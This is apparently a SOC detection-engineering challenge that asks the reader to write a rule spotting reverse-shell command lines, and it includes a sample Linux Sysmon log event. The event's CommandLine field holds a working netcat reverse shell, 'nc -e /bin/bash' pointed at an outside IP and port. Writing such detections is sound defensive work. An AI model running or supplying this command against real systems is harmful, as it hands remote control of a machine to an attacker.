## Description
A reverse shell is a network attack technique where the victim system initiates a connection to an attacker’s control server and redirects the command-line input/output streams to that connection, allowing the remote attacker to execute commands on the victim system.

Since reverse shells often indicate that a system has been compromised or is being accessed without authorization, detecting such behavior is crucial for system security. Reverse shells can be established using command lines and can be implemented using various tools and techniques, including but not limited to Bash, Python, Perl, Netcat, PowerShell, and others.

## Challenge Objective
Write a rule to identify reverse shell establishment behavior in command lines. Focus on recognizing patterns where network tools (such as nc, netcat) and shell commands (such as bash, sh, cmd) appear along with IP addresses and port numbers.

## Data Sample
{
    "Name": "ParentUser", 
    "Guid": "{ff032593-a8d3-4f13-b0d6-01fc615a0f97}", 
    "EventID": "1", 
    "Version": "5", 
    "Level": "4", 
    "Task": "1", 
    "Opcode": "0", 
    "Keywords": "0x8000000000000000", 
    "SystemTime": "2025-03-20T07:23:00.832926000Z", 
    "EventRecordID": "37693", 
    "ProcessID": "141106", 
    "ThreadID": "141106", 
    "Channel": "Linux-Sysmon/Operational", 
    "Computer": "ubuntulog", 
    "UserId": "0", 
    "RuleName": "-", 
    "UtcTime": "2025-03-20 07:23:00.837", 
    "ProcessGuid": "{15b7b743-c254-67db-9525-6c8ea7610000}", 
    "ProcessId": "142108", 
    "Image": "/usr/bin/nc", 
    "FileVersion": "-", 
    "Description": "-", 
    "Product": "-", 
    "Company": "-", 
    "OriginalFileName": "-", 
    "CommandLine": "nc -e /bin/bash 172.168.55.1 8885", 
    "CurrentDirectory": "/home", 
    "User": "root", 
    "LogonGuid": "{15b7b743-0000-0000-0000-000005000000}", 
    "LogonId": "0", 
    "TerminalSessionId": "8", 
    "IntegrityLevel": "no level", 
    "Hashes": "SHA256=78041c0b15cd0dbb2ff8ce7678d4128f0f0faac2696564896128c508a9f3cdb2", 
    "ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}", 
    "ParentProcessId": "3524", 
    "ParentImage": "-", 
    "ParentCommandLine": "-", 
    "ParentUser": "-"
    }

    References: 
    - https://www.soc-labs.top/en/detections/62#:~:text=References-,Reverse%20shell,-Reverse%20shells%20%2D%20The
    - https://www.soc-labs.top/en/detections/62#:~:text=Reverse%20shells%20%2D%20The%20Portal%20of%20Knowledge
